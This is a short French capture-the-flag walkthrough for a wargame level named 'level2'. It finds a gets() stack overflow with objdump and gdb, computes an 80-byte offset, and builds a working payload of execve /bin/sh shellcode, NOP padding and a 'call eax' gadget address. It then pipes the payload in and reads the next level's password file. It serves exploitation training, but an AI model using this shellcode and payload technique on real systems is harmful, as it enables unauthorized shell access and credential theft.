```
objdump -M intel -d level2
```

Dans le main on voit un appel à une fonction "p", regardons ce qu'elle fait.
Il semble que comme precedemment elle utilise la fonction gets.
Essayons de la faire segfalt comme precedemment

```
echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" > /tmp/test
gdb level2
r < /tmp/test

Program received signal SIGSEGV, Segmentation fault.
0x37634136
```

Faisons le meme travail avec le meme site web pour calculer l'offset.
Offset = 80

L'ancien trick ne marche pas.
Après recherche, il semble que nous puissions tout de même utiliser une faille.

On remarque un call à eax. Eax appelle la fonction qu'elle pointe.
Il faut appeller une fonction à l'aide ce call afin d'obtenir notre résultat.

```
objdump -d level2 | grep call
80484cf:	ff d0                	call   *%eax
```

Further documentation here:
https://dhavalkapil.com/blogs/Shellcode-Injection/
La taille de l'offset est 80
Notre script en fait 25:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```
Donc nous ajoutons 80 - 25 = 55 NOP afin de completer l'espace "vide" (\x90)

```
python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*(55) + "\xcf\x84\x04\x08"' > /tmp/test
cat /tmp/test - | ./level2
cat /home/user/level3/.pass
```

Nous avons donc réussi !
